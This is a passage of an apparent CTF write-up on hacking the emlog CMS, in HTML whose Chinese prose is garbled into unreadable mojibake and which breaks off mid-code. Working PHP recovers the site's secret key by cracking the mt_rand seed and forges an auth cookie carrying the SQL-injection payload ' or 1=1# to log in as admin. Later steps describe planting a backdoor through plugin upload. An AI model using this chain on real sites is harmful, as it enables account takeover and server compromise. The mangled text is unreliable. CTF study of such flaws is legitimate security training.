class="line">EM_AUTHCOOKIE_RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr=%20</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const AUTH_COOKIE_NAME = &#x27;EM_AUTHCOOKIE_&quot; . getRandStr(32, false) . &quot;&#x27;;</span><br></pre></td></tr></table></figure><p>å› æ­¤ï¼ŒgetRandStr(32, false)çš„å€¼å°±æ˜¯RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr</p><p>è¿™é‡Œçš„falseæ˜¯ä¸åŒ…å«ç‰¹æ®Šå­—ç¬¦ï¼Œä¸ç”¨ç®¡ã€‚</p><p>ç„¶åæˆ‘ä»¬å°±éœ€è¦é€†æ¨AUTH_KEYçš„å€¼äº†ï¼è¿™å¾ˆç®€å•ï¼Œæˆ‘çš„wpé‡Œæœ‰è¯¦ç»†å†™è¿‡ã€‚è¦æ³¨æ„çš„æ˜¯AUTH_KEYæ˜¯å…ˆç”Ÿæˆçš„ï¼ŒAUTH_COOKIE_NAMEæ˜¯åç”Ÿæˆçš„ï¼Œå› æ­¤å‰é¢è¦è¡¥ä½32ä½0ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;</span><br><span class="line"><span class="variable">$str_long2</span> = <span class="string">&quot;RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr&quot;</span>;</span><br><span class="line"><span class="variable">$ans</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">32</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;0 0 0 0 &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long2</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$ans</span>=<span class="title function_ invoke__">strpos</span>(<span class="variable">$str_long1</span>,<span class="variable">$str_long2</span>[<span class="variable">$i</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ans</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$ans</span>.<span class="string">&#x27; &#x27;</span>.<span class="string">&#x27;0 &#x27;</span>.(<span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>)-<span class="number">1</span>).<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 43 43 0 61 1 1 0 61 26 26 0 61 48 48 0 61 21 21 0 61 39 39 0 61 35 35 0 61 51 51 0 61 57 57 0 61 50 50 0 61 38 38 0 61 4 4 0 61 51 51 0 61 37 37 0 61 32 32 0 61 38 38 0 61 17 17 0 61 57 57 0 61 58 58 0 61 11 11 0 61 5 5 0 61 9 9 0 61 47 47 0 61 0 0 0 61 11 11 0 61 40 40 0 61 55 55 0 61 24 24 0 61 16 16 0 61 50 50 0 61 11 11 0 61 17 17 0 61 </span><br></pre></td></tr></table></figure><p>ä½¿ç”¨php_mt_seedå·¥å…·çˆ†ç ´ç§å­ã€‚</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250216182846919.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2430606281</span><br></pre></td></tr></table></figure><p>æœ¬åœ°è¿è¡Œä¸€ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRandStr</span>(<span class="params"><span class="variable">$length</span> = <span class="number">12</span>, <span class="variable">$special_chars</span> = <span class="literal">true</span>, <span class="variable">$numeric_only</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$numeric_only</span>) &#123;</span><br><span class="line">        <span class="variable">$chars</span> = <span class="string">&#x27;0123456789&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$special_chars</span>) &#123;</span><br><span class="line">            <span class="variable">$chars</span> .= <span class="string">&#x27;!@#$%^&amp;*()&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$randStr</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$chars_length</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$chars</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$randStr</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$chars</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="variable">$chars_length</span> - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$randStr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">2430606281</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">getRandStr</span>(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">getRandStr</span>(<span class="number">32</span>, <span class="literal">false</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yxuzKkM2QC8L8WLPFvawb(mI4R&amp;NglOA</span><br><span class="line">RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr</span><br></pre></td></tr></table></figure><p>ç„¶åç®—å‡ºAUTH_KEYå³å¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const AUTH_KEY = &#x27;&quot; . getRandStr(32) . md5(getUA()) . &quot;&#x27;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UAå¤´ä»é¢˜ç›®ä¸­å‘å¸ƒçš„ç¬¬ä¸€ç¯‡æµ‹è¯•æ–‡ç« ä¸­å¯ä»¥è·å¾—ã€‚</span><br><span class="line">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36</span><br><span class="line"></span><br><span class="line">echo(md5(&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36&quot;));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yxuzKkM2QC8L8WLPFvawb(mI4R&amp;NglOA558fb80a37ff0f45d5abbc907683fc02</span><br></pre></td></tr></table></figure><p>æ‹¿ä¸‹äº†AUTH_KEYã€‚</p><p>æ¥ä¸‹æ¥çš„å…³é”®ç‚¹æ˜¯ä¸‹è¿°ä¸‰ä¸ªå‡½æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">generateAuthCookie</span>(<span class="params"><span class="variable">$user_login</span>, <span class="variable">$expiration</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="variable">$key</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">emHash</span>(<span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>);</span><br><span class="line">       <span class="variable">$hash</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>, <span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$hash</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">emHash</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$data</span>, AUTH_KEY);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">validateAuthCookie</span>(<span class="params"><span class="variable">$cookie</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$cookie</span>)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$cookie_elements</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$cookie</span>);</span><br><span class="line">       <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$cookie_elements</span>) !== <span class="number">3</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">list</span>(<span class="variable">$username</span>, <span class="variable">$expiration</span>, <span class="variable">$hmac</span>) = <span class="variable">$cookie_elements</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$expiration</span>) &amp;&amp; <span class="variable">$expiration</span> &lt; <span class="title function_ invoke__">time</span>()) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$key</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">emHash</span>(<span class="variable">$username</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>);</span><br><span class="line">       <span class="variable">$hash</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$username</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>, <span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$hmac</span> !== <span class="variable">$hash</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$user</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">getUserDataByLogin</span>(<span class="variable">$username</span>);</span><br><span class="line">       <span class="keyword">if</span> (!<span class="variable">$user</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$user</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>generateAuthCookieå‡½æ•°ï¼ŒvalidateAuthCookieå‡½æ•°ï¼ŒemHashå‡½æ•°ã€‚generateAuthCookieæ˜¯ç”Ÿæˆè®¤è¯cookieï¼Œæˆ‘ä»¬æƒ³è¦ä¼ªé€ cookieç™»å½•çš„è¯é‚£å°±è¦ä½¿ç”¨åˆ°è¿™ä¸ªgenerateAuthCookieå‡½æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">generateAuthCookie</span>(<span class="params"><span class="variable">$user_login</span>, <span class="variable">$expiration</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$key</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">emHash</span>(<span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>);</span><br><span class="line">        <span class="variable">$hash</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>, <span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$hash</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ä¼ å‚$user_loginå’Œ$expirationï¼Œæˆ‘ä»¬æŸ¥æ‰¾ç”¨æ³•çœ‹ä¸€ä¸‹æ˜¯å•¥ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">setAuthCookie</span>(<span class="params"><span class="variable">$user_login</span>, <span class="variable">$persist</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$persist</span>) &#123;</span><br><span class="line">            <span class="variable">$expiration</span> = <span class="title function_ invoke__">time</span>() + <span class="number">3600</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">12</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$expiration</span> = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$auth_cookie_name</span> = AUTH_COOKIE_NAME;</span><br><span class="line">        <span class="variable">$auth_cookie</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">generateAuthCookie</span>(<span class="variable">$user_login</span>, <span class="variable">$expiration</span>);</span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="variable">$auth_cookie_name</span>, <span class="variable">$auth_cookie</span>, <span class="variable">$expiration</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>$expirationå‡ ä¹ä¸ç”¨ç®¡äº†ï¼Œçœ‹$user_loginå°±è¡Œï¼Œç»§ç»­æŸ¥æ‰¾ç”¨æ³•ã€‚</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250216184650642.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>user_loginæ˜¯ç”¨æˆ·åã€‚é‚£å°±å¾ˆç®€å•äº†ï¼Œæˆ‘ä»¬çŸ¥é“ç”¨æˆ·åçš„è¯å°±èƒ½ä¼ªé€ cookieå®ç°ç™»å½•ã€‚</p><p>ä½†æ˜¯æ²¡æœ‰ç»™å‡ºä»»ä½•ç”¨æˆ·åã€‚ã€‚ã€‚</p><p>æ‰¾äº†åŠå¤©ï¼Œå‘ç°ï¼åœ¨validateAuthCookieå‡½æ•°ä¸­æœ‰ä¸ªgetUserDataByLoginçš„æ–¹æ³•ï¼Œåº”è¯¥æ˜¯é€šè¿‡ç”¨æˆ·åè·å–ç”¨æˆ·ä¿¡æ¯çš„ä¸€ä¸ªæ–¹æ³•ã€‚</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250216184841658.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>å…¶ä¸­å­˜åœ¨sqlè¯­å¥çš„æ‹¼æ¥ï¼ä¸€çœ¼sqlæ³¨å…¥ã€‚ã€‚</p><p>å…ˆæ¥çœ‹çœ‹validateAuthCookieå‡½æ•°ï¼Œæ‹ä¸€ä¸‹</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250216185142267.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>è¿™ä¸ªå‡½æ•°æ¥æ”¶è®¤è¯cookieï¼Œç„¶åå°†å…¶æ‹†åˆ†ä¸ºåŸæ¥çš„å½¢å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list($username, $expiration, $hmac) = $cookie_elements;</span><br></pre></td></tr></table></figure><p>å› æ­¤ï¼Œsqlæ³¨å…¥ç›´æ¥ä¸‡èƒ½å¯†ç å°±èƒ½è¿›å…¥äº†ï¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateAuthCookie</span>(<span class="params"><span class="variable">$user_login</span>, <span class="variable">$expiration</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">emHash</span>(<span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>);</span><br><span class="line">    <span class="variable">$hash</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>, <span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$hash</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">emHash</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$data</span>, <span class="string">&#x27;yxuzKkM2QC8L8WLPFvawb(mI4R&amp;NglOA558fb80a37ff0f45d5abbc907683fc02&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">generateAuthCookie</span>(<span class="string">&quot;&#x27; or 1=1#&quot;</span>,<span class="number">0</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=1#|0|71f4f3bbe056e7791debdc858b458a7c</span><br></pre></td></tr></table></figure><p>ç„¶åå¯¹validateAuthCookieå‡½æ•°æŸ¥æ‰¾ä¸€ä¸‹ç”¨æ³•ï¼Œçœ‹çœ‹æ€ä¹ˆå°†ä¼ªé€ çš„cookieä¼ å…¥ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">checkAuthCookie</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[AUTH_COOKIE_NAME])) &#123;</span><br><span class="line">        <span class="title class_">Output</span>::<span class="title function_ invoke__">authError</span>(<span class="string">&#x27;auth cookie error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$userInfo</span> = loginauth::<span class="title function_ invoke__">validateAuthCookie</span>(<span class="variable">$_COOKIE</span>[AUTH_COOKIE_NAME]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$userInfo</span>) &#123;</span><br><span class="line">        <span class="title class_">Output</span>::<span class="title function_ invoke__">authError</span>(<span class="string">&#x27;auth cookie error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;curUserInfo = <span class="variable">$userInfo</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;curUid = (<span class="keyword">int</span>)<span class="variable">$userInfo</span>[<span class="string">&#x27;uid&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250216190820178.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>ç›´æ¥è¿›åˆ°åå°ï¼è€¶è€¶è€¶ï¼ï¼ï¼</p><p>æŸ¥ä¸€ä¸‹åå°æ¼æ´å§ã€‚ã€‚ã€‚æœ¬ä»¥ä¸ºä¼šç›´æ¥ç»™flag</p><p><a href="https://blog.csdn.net/W13680336969/article/details/137267677">https://blog.csdn.net/W13680336969/article/details/137267677</a></p><p><a href="https://github.com/yangliukk/emlog/blob/main/Plugin-getshell.md">https://github.com/yangliukk/emlog/blob/main/Plugin-getshell.md</a></p><p>æ¥ä¸‹æ¥è·Ÿç€æ–‡ç« èµ°ä¸€ä¸‹</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250216191127008.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>åœ¨ç½‘ä¸Šæ‰¾ä¸€ä¸ªæ’ä»¶å‹ç¼©åŒ…ï¼Œæ„å»ºå¦‚ä¸‹æ ¼å¼ï¼Œå¾€é‡Œé¢å¡ä¸€ä¸ªåé—¨å³å¯ã€‚ï¼ˆè¿™é‡Œæˆ‘ç›´æ¥æŠŠæ’ä»¶ä¸­çš„postchat.phpæ–‡ä»¶å†…å®¹æ”¹æˆäº†åé—¨ï¼‰</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250216194011009.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>ä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“ä¸Šä¼ çš„ç›®å½•</p><p>çœ‹ä¸€ä¸‹plugin.phpæ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$action</span> == <span class="string">&#x27;upload_zip&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;APP_UPLOAD_FORBID&#x27;</span>) &amp;&amp; APP_UPLOAD_FORBID === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">emMsg</span>(<span class="string">&#x27;ç³»ç»Ÿç¦æ­¢ä¸Šä¼ å®‰è£…åº”ç”¨&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">LoginAuth</span>::<span class="title function_ invoke__">checkToken</span>();</span><br><span class="line">    <span class="variable">$zipfile</span> = <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;pluzip&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;pluzip&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$zipfile</span>[<span class="string">&#x27;error&#x27;</span>] == <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">emDirect</span>(<span class="string">&quot;./plugin.php?error_d=1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$zipfile</span>[<span class="string">&#x27;error&#x27;</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">emDirect</span>(<span class="string">&quot;./plugin.php?error_g=1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$zipfile</span> || <span class="variable">$zipfile</span>[<span class="string">&#x27;error&#x27;</span>] &gt;= <span class="number">1</span> || <span class="keyword">empty</span>(<span class="variable">$zipfile</span>[<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">emMsg</span>(<span 